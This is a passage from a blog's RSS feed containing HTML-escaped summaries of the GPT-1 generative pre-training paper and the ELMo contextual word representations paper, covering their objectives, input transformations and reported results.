&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Paper Summary #3 - Improving Language Understanding by Generative Pre-Training</title>
      <link>https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/</link>
      <pubDate>Sun, 02 May 2021 13:42:14 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Paper&lt;/strong&gt;: Improving Language Understanding by Generative Pre-Training&lt;br&gt;
&lt;strong&gt;Link&lt;/strong&gt;: &lt;a href=&#34;https://s3-us-west-2.amazonaws.com/openai-assets/research-covers/language-unsupervised/language_understanding_paper.pdf&#34;&gt;https://bit.ly/3xITvGP&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Blog&lt;/strong&gt;: &lt;a href=&#34;https://openai.com/blog/language-unsupervised/&#34;&gt;https://openai.com/blog/language-unsupervised/&lt;/a&gt; &lt;br&gt;
&lt;strong&gt;Authors&lt;/strong&gt;: Alec Radford, Karthik Narasimhan, Tim Salimans, Ilya Sutskever&lt;br&gt;
&lt;strong&gt;Code&lt;/strong&gt;: &lt;a href=&#34;https://github.com/openai/finetune-transformer-lm&#34;&gt;https://bit.ly/3gUFrUX&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;what&#34;&gt;What?&lt;/h2&gt;
&lt;p&gt;The paper proposes a semi-supervised technique that shows better performance on a wide variety of tasks like textual entailment, question answering, semantic similarity text classification by using a single task-agnostic model. The model can overcome the constraints of the small amount of annotated data for these specific tasks by performing an unsupervised generative-pretraining of a language model on a large diverse text corpus followed by supervised discriminative fine-tuning on each specific task. The pretraining model remains the same for all the tasks. Only a small, task-aware input adaptation is required when performing the fine-tuning. The model significantly improved the state-of-the-art (at the time) in 9 of the 12 tasks studied.&lt;/p&gt;
&lt;h2 id=&#34;why&#34;&gt;Why?&lt;/h2&gt;
&lt;p&gt;Most deep learning models require a substantial amount of data, which makes them difficult to train for tasks in which there is a dearth of good quality annotated data. Historically, pre-trained word embeddings have been used for such cases but the word-level information in itself is sometimes not enough for many of the complex tasks.&lt;/p&gt;
&lt;h2 id=&#34;how&#34;&gt;How?&lt;/h2&gt;
&lt;p&gt;The goal of the model is to learn a universal representation that transfers with little adaptation to a wide range of tasks. The paper assumes access to a large corpus of unlabeled text and several datasets with manually annotated training examples (the target tasks). The unlabeled corpus and the annotated datasets need not be in the same domain.&lt;/p&gt;
&lt;p&gt;A two-stage training procedure is used. First, a language modelling (LM) objective is used on the unlabeled data to learn the initial parameters of the model. Next, these parameters are adapted to a target task using the corresponding supervised objective.&lt;/p&gt;
&lt;p&gt;A Transformer (specifically a Transfomer decoder) is used as the underlying architecture. Transformers work better than LSTMs (shown in the results as well) because they can capture long-term dependencies well which results in robust transfer performance across diverse tasks.  Furthermore, during the transfer, as mentioned above, task-specific input adaptations are used which process the structured text input as a single contiguous sequence of tokens. This is something very interesting and will be shown in the subsequent sections.&lt;/p&gt;
&lt;h3 id=&#34;unsupervised-pre-training&#34;&gt;Unsupervised pre-training&lt;/h3&gt;
&lt;p&gt;A standard forward LM objective is used to maximise the likelihood -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/unsupervised-lm.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/unsupervised-lm.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here, , &lt;em&gt;U&lt;/em&gt; is the corpus of tokens {&lt;em&gt;u&lt;/em&gt;&lt;sub&gt;1&lt;/sub&gt;,&amp;hellip; &lt;em&gt;u&lt;/em&gt;&lt;sub&gt;n&lt;/sub&gt;}, &lt;em&gt;k&lt;/em&gt; is the context window size and the conditional probability &lt;em&gt;P&lt;/em&gt;  is modeled using a network with parameters Θ. SGD is used to learn the parameters. The model uses a multi-layer Transformer decoder. The multi-head self-attention is applied over the input context tokens. This is followed by position-wise feedforward layers to produce an output probability distribution over the target tokens.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/probcalc.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/probcalc.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here &lt;em&gt;U&lt;/em&gt; is (u&lt;sub&gt;-k&lt;/sub&gt;,&amp;hellip;, u&lt;sub&gt;-1&lt;/sub&gt;) which is the context vector of tokens, &lt;em&gt;n&lt;/em&gt; is the number of layers, &lt;em&gt;W&lt;/em&gt;&lt;sub&gt;e&lt;/sub&gt; is the token embedding matrix and &lt;em&gt;W&lt;/em&gt;&lt;sub&gt;p&lt;/sub&gt; is the position embedding matrix.&lt;/p&gt;
&lt;h3 id=&#34;supervised-fine-tuning&#34;&gt;Supervised fine-tuning&lt;/h3&gt;
&lt;p&gt;After the training of the model with optimization &lt;em&gt;L&lt;/em&gt;&lt;sub&gt;1&lt;/sub&gt;, the parameters are now adapted to the supervised target task. The labelled dataset is denoted by &lt;em&gt;C&lt;/em&gt;, where each instance is a sequence of input tokens, &lt;em&gt;x&lt;/em&gt;&lt;sup&gt;1&lt;/sup&gt;,&amp;hellip;,&lt;em&gt;x&lt;/em&gt;&lt;sup&gt;m&lt;/sup&gt;, along with a label &lt;em&gt;y&lt;/em&gt;. The inputs are passed through the pre-trained model to obtain the final transformer block&amp;rsquo;s activation &lt;em&gt;h&lt;/em&gt;&lt;sub&gt;l&lt;/sub&gt;&lt;sup&gt;m&lt;/sup&gt;, which is then fed into an added linear output layer with parameters &lt;em&gt;W&lt;/em&gt;&lt;sub&gt;y&lt;/sub&gt; to predict &lt;em&gt;y&lt;/em&gt;.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/fintune1.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/fintune1.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The objective to be maximized is as follows&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/fintune2.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/fintune2.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Using an LM objective as an auxiliary objective to the finetuning helped to improve the generalization of the supervised model and make it converge faster.&lt;/p&gt;
&lt;p&gt;The overall objective can be written as -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/objective-fin.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/objective-fin.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;h3 id=&#34;task-specific-input-transformations&#34;&gt;Task-specific input transformations&lt;/h3&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/input-transform.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/input-transform.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Since the pretrained model is trained on a contiguous sequence of texts, to handle the inputs of the various tasks, certain input transformations are needed as shown above. These transformations help to avoid making extensive changes to the architecture across tasks.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Textual Entailment&lt;/strong&gt; - The premise (&lt;em&gt;p&lt;/em&gt;) and the hypothesis (&lt;em&gt;h&lt;/em&gt;) sequences are concatenated with a delimiter token in between.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Similarity&lt;/strong&gt; - Since there is no inherent ordering of the two sequences being compared, the input sequence is modified to contain both possible sentence orderings (with a delimiter in between). Each of these concatenated sequences is processed independently to produce two sequence representations &lt;em&gt;h&lt;/em&gt;&lt;sub&gt;l&lt;/sub&gt;&lt;sup&gt;m&lt;/sup&gt; which are then element-wise added before feeding to the linear output layer.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Question Answering&lt;/strong&gt; - This one is interesting. For a given context document &lt;em&gt;z&lt;/em&gt;, question &lt;em&gt;q&lt;/em&gt; and a set of possible answers {&lt;em&gt;a&lt;/em&gt;&lt;sub&gt;k&lt;/sub&gt;}. The document and question are concatenated with each of the possible answers, with a delimiter token in between [&lt;em&gt;z&lt;/em&gt;; &lt;em&gt;q&lt;/em&gt;;$;&lt;em&gt;a&lt;/em&gt;&lt;sub&gt;k&lt;/sub&gt;]. Each of these sequences is processed independently by the model and then normalized by a softmax layer to produce an output distribution over possible answers.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The model specifications for the experimental setup are shown below -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/setup.PNG&#34; data-caption=&#34;Experimental Setup&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/setup.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Experimental Setup
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;h2 id=&#34;results&#34;&gt;Results&lt;/h2&gt;
&lt;p&gt;The datasets that were used are listed below -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/datasets.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/datasets.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Natural Language Inference&lt;/strong&gt; - This task is challenging due to the presence of a wide variety of phenomena like lexical entailment, coreference, and lexical and syntactic ambiguity. The model performs better than the state-of-the-art in 4 (MNLI, QNLI, SNLI, SciTail) out of 5 datasets.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/nli.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/nli.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Question Answering and Commonsense Reasoning&lt;/strong&gt; - The RACE dataset (passages with associated questions from middle and high school exams) and Story Cloze dataset (selecting correct ending to multi-sentence stories from two options) were used. The model outperformed the baseline on both these datasets.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/qa.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/qa.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Semantic Similarity&lt;/strong&gt; - The challenges in this task are recognizing rephrasing, negation, and handling ambiguity. The model performs better on 2 (QQP and STS-B) of the 3 datasets.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Classification&lt;/strong&gt; - The model performs better on both Corpus of Linguistic Accepttability (CoLA) dataset and is at par with the state-of-the-art results on the Stanford Sentiment Treebank dataset.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/classification.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/classification.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Key points from the analysis section -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;More the number of layers that are transferred from the pretrained model to the supervised target task, the better is the performance on the target tasks.&lt;/li&gt;
&lt;li&gt;To understand whether the unsupervised pre-training is effective or not, zero-shot testing was also performed i.e., using the pre-trained model directly without any finetuning. The model performance is stable and steadily increases over training suggesting that the generative pre-training supports the learning of a wide variety of task-relevant functionality. LSTMs exhibit higher variance in their zero-shot performance.
The testing and input transformations for using the pretrained model directly are explained below -













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/zeroshot.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/zeroshot.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/trend.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-02_language_understanding_generative_pretraining/images/trend.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;From the ablation studies, the authors show that the auxiliary LM objective helps on the NLI tasks and QQP (Quora Question Pairs data).&lt;/li&gt;
&lt;li&gt;Overall, larger datasets benefit from the auxiliary objective more than the smaller datasets.&lt;/li&gt;
&lt;li&gt;In general, the Transformer architecture performs better than a 2048 unit single layer LSTM model (if the Transformer in the pretraining model is replaced by an LSTM) on all datasets except the MRPC (Microsoft Paraphrase Corpus for semantic similarity) dataset.&lt;/li&gt;
&lt;li&gt;On comparing this model with the same transformer architecture trained in a supervised manner, it is observed that the model with pre-training performs better. This consistent for all the tasks mentioned in the paper, suggesting that pre-training helps to capture important linguistic information which is not captured when training with a supervised approach alone.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;I have also released an annotated version of the paper. If you are interested, you can find it &lt;a href=&#34;https://github.com/shreyansh26/Annotated-ML-Papers/blob/main/GPT1.pdf&#34;&gt;here&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is all for now!&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script data-name=&#34;BMC-Widget&#34; data-cfasync=&#34;false&#34; src=&#34;https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js&#34; data-id=&#34;shreyanshsingh&#34; data-description=&#34;Support me on Buy me a coffee!&#34; data-message=&#34;&#34; data-color=&#34;#FF5F5F&#34; data-position=&#34;Right&#34; data-x_margin=&#34;18&#34; data-y_margin=&#34;18&#34;&gt;&lt;/script&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Paper Summary #2 - Deep contextualized word representations</title>
      <link>https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/</link>
      <pubDate>Sun, 25 Apr 2021 15:13:13 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Paper&lt;/strong&gt;: Deep contextualized word representations&lt;br&gt;
&lt;strong&gt;Link&lt;/strong&gt;: &lt;a href=&#34;https://arxiv.org/abs/1802.05365&#34;&gt;https://arxiv.org/abs/1802.05365&lt;/a&gt; &lt;br&gt;
&lt;strong&gt;Authors&lt;/strong&gt;: Matthew E. Peters, Mark Neumann, Mohit Iyyer, Matt Gardner, Christopher Clark, Kenton Lee, Luke Zettlemoyer&lt;br&gt;
&lt;strong&gt;Code&lt;/strong&gt;: &lt;a href=&#34;https://github.com/allenai/allennlp/blob/main/allennlp/modules/elmo.py&#34;&gt;https://bit.ly/3xpHNAI&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; - Since this is a relatively old paper, all the performance comparisons and state-of-the-art claims mentioned below should only be considered for the models at the time the paper was published.&lt;/p&gt;
&lt;h2 id=&#34;what&#34;&gt;What?&lt;/h2&gt;
&lt;p&gt;The paper proposes a new type of deep contextualized word representation that helps to effectively capture the syntactic and semantic characteristics of the word along with the linguistic context of the word. It can help differentiate the same word being used in different contexts with different meanings. The representations (embeddings) are learned from the internal states of a deep bidirectional language model (biLM). The embeddings, when used with the existing models, significantly improved the state of the art in six NLP problems - Question Answering, Natural Language Inference, Semantic Role Labeling, Coreference Resolution, Named Entity Recognition and Sentiment Analysis.&lt;/p&gt;
&lt;h2 id=&#34;why&#34;&gt;Why?&lt;/h2&gt;
&lt;p&gt;The existing word representations commonly in use were Word2Vec and GloVe. However, there was a need to capture even richer word representations. The paper states that the two main requirements of a good representation should be that they should be able to capture the complex characteristics of the word use and at the same time capture polysemy as well. This is the idea behind using ELMo (Embeddings from Language Models) representations.&lt;/p&gt;
&lt;h2 id=&#34;how&#34;&gt;How?&lt;/h2&gt;
&lt;p&gt;As a high-level overview, it can be said that the ELMo representations are a function of the entire input sequence. A two-layer biLM model with character-level convolutions is trained on a text corpus. The ELMo word representations are computed as a linear function of the internal network states of the biLM. The biLM is pretrained on a large scale and the ELMo representations can be incorporated into several deep learning-based NLP architectures.&lt;/p&gt;
&lt;h3 id=&#34;bilm-bidirectional-language-model&#34;&gt;biLM (Bidirectional Language Model)&lt;/h3&gt;
&lt;p&gt;A forward language model computes the probability of the sequence by modelling the probability of a token t&lt;sub&gt;k&lt;/sub&gt; given the history (t&lt;sub&gt;1&lt;/sub&gt;, &amp;hellip;, t&lt;sub&gt;k-1&lt;/sub&gt;). Similarly, a backward language model predicts the previous token given the nature context i.e., it performs the same function but in reverse order.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/forwardlm.PNG&#34; data-caption=&#34;Forward LM probability modelling&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/forwardlm.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Forward LM probability modelling
  &lt;/figcaption&gt;


&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/backwardlm.PNG&#34; data-caption=&#34;Backward LM probability modelling&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/backwardlm.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Backward LM probability modelling
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;In a forward LM, a context-independent token representation x&lt;sub&gt;k&lt;/sub&gt;&lt;sup&gt;LM&lt;/sup&gt; is obtained from a character-level CNN and then passed through &lt;em&gt;L&lt;/em&gt; layers of LSTMs. At each position &lt;em&gt;k&lt;/em&gt;, the LSTM layer outputs a context-dependent representation h&lt;sub&gt;&lt;i&gt;k,j&lt;/i&gt;&lt;/sub&gt;&lt;sup&gt;LM&lt;/sup&gt;, where &lt;em&gt;j&lt;/em&gt; = 1, &amp;hellip;, &lt;em&gt;L&lt;/em&gt;. the top layer of the LSTM output is used to predict the next token t&lt;sub&gt;k+1&lt;/sub&gt; with a Softmax layer. The same procedure is applied to the backward LM as well.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/bilm.PNG&#34; data-caption=&#34;biLM probability modelling&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/bilm.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    biLM probability modelling
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;A biLM combines both the forward and backward LM. The above formulation jointly optimizes the log-likelihood of the forward and backward directions.&lt;/p&gt;
&lt;p&gt;The formulation ties both the token representation Θ&lt;sub&gt;x&lt;sub&gt; and the Softmax layer Θ&lt;sub&gt;s&lt;/sub&gt; Separate paremeters are maintained for the forward and backward LSTMs.&lt;/p&gt;
&lt;p&gt;Next, we look at getting the word representations using ELMo.&lt;/p&gt;
&lt;h3 id=&#34;elmo&#34;&gt;ELMo&lt;/h3&gt;
&lt;p&gt;ELMo is a task-specific combination of the intermediate layer representations of the biLM model. If we have &lt;em&gt;L&lt;/em&gt; LSTM layers, then for each token t&lt;sub&gt;k&lt;/sub&gt; we have 2L + 1 representations.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/elmorepr.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/elmorepr.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Now to get one single vector for each token, all the representations in &lt;em&gt;R&lt;/em&gt; are merged to one. Usually, task-specific weighting is performed.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/elmoeq.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/elmoeq.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The &lt;i&gt;s&lt;/i&gt;&lt;sup&gt;&lt;i&gt;task&lt;/i&gt;&lt;/sup&gt; are softmax normalized weights and the scale parameter γ&lt;sup&gt;&lt;i&gt;task&lt;/i&gt;&lt;/sup&gt; allows the task model to scale the entire ELMo vector. In some cases, applying LayerNorm to each biLM layer before weighting also helped.&lt;/p&gt;
&lt;h3 id=&#34;using-elmo-for-supervised-nlp-tasks&#34;&gt;Using ELMo for supervised NLP tasks&lt;/h3&gt;
&lt;p&gt;We start with a pretrained biLM model, The biLM is run to record the layer representations for each word. When using any supervised deep learning MLP model have a common architecture for the lowest layers. They usually use a context-independent token representation x&lt;sub&gt;k&lt;/sub&gt; for each token position using pre-trained embeddings and optionally also using character-based representations. Then, in the higher layers, the model forms context-sensitive representations using RNNs, CNNs or whatever, as per the task and the model.
For using ELMo, we can start in the same manner. We obtain the embeddings from the freezed weights of the biLM. Now instead of passing just x&lt;sub&gt;k&lt;/sub&gt; to the above layers, we will pass &lt;/br&gt; [x&lt;sub&gt;k&lt;/sub&gt;; &lt;strong&gt;ELMo&lt;/strong&gt;&lt;sub&gt;k&lt;/sub&gt;&lt;sup&gt;task&lt;/sup&gt; ] into the task model layers. For some tasks like SNLI (Natural language Inference) and SQuAD (Question-Answering), it was also seen that including ELMo at the output of the task model by introducing another set of output specific linear weights and replacing h&lt;sub&gt;k&lt;/sub&gt; with [h&lt;sub&gt;k&lt;/sub&gt;; &lt;strong&gt;ELMo&lt;/strong&gt;&lt;sub&gt;k&lt;/sub&gt;&lt;sup&gt;task&lt;/sup&gt; ] led to an improvement.&lt;/p&gt;
&lt;p&gt;Additionally, in some cases, regularizing the ELMo weights with λ||&lt;strong&gt;w&lt;/strong&gt;||&lt;sub&gt;2&lt;/sub&gt;&lt;sup&gt;2&lt;/sup&gt; helped introduce an inductive bias on the ELMo weights to make it stay close to the average of all biLM layers.&lt;/p&gt;
&lt;h3 id=&#34;pre-trained-bidirectional-language-model-architecture&#34;&gt;Pre-trained bidirectional language model architecture&lt;/h3&gt;
&lt;p&gt;The pre-trained biLM used in the paper is similar to the architecture in &lt;a href=&#34;https://arxiv.org/abs/1602.02410&#34;&gt;Józefowicz et al.&lt;/a&gt;. It is modified to support joint training of both directions and a residual connection is added between the LSTM layers. The size of the embeddings and layers were from what was in the &lt;code&gt;CNN-BIG-LSTM&lt;/code&gt; architecture in &lt;a href=&#34;https://arxiv.org/abs/1602.02410&#34;&gt;Józefowicz et al.&lt;/a&gt;. The final model has &lt;em&gt;L&lt;/em&gt;=2 biLSTM layers with 4096 units and 512-dimensional embeddings and a residual connection from the first to the second layer. The context insensitive type representation uses 2048 character n-gram convolutional filters followed by two highway layers and a linear projection down to a 512 representation. As a result, the biLM provides three layers of representations for each input token, including those outside the training set due to the purely
character input.&lt;/p&gt;
&lt;h2 id=&#34;results&#34;&gt;Results&lt;/h2&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/results.PNG&#34; data-caption=&#34;Results comparison of the baseline models with the ones used along with ELMo&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/results.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Results comparison of the baseline models with the ones used along with ELMo
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The details of the baseline models are given in the paper. In all the tasks, the use of the ELMo representations led to improvement in the state-of-the-art results.&lt;/p&gt;
&lt;p&gt;Key points from the analysis section -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Regularization parameter λ is important. λ=1 means that we are effectively reducing the weighting function to a simple average over the layers, while smaller values like λ=0.001 allows the layer weights to vary.&lt;/li&gt;
&lt;li&gt;The fact that we take the representations from all the layers gives a better performance as compared to just taking the topmost layer. Taking just the last layer is still better than the baseline.&lt;/li&gt;
&lt;li&gt;A small λ is preferred in most cases with ELMo, although for NER, a task with a smaller training set, the results are insensitive to λ.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/layercomp.PNG&#34; data-caption=&#34;Baseline vs ELMo last layer vs All the layers&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/layercomp.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
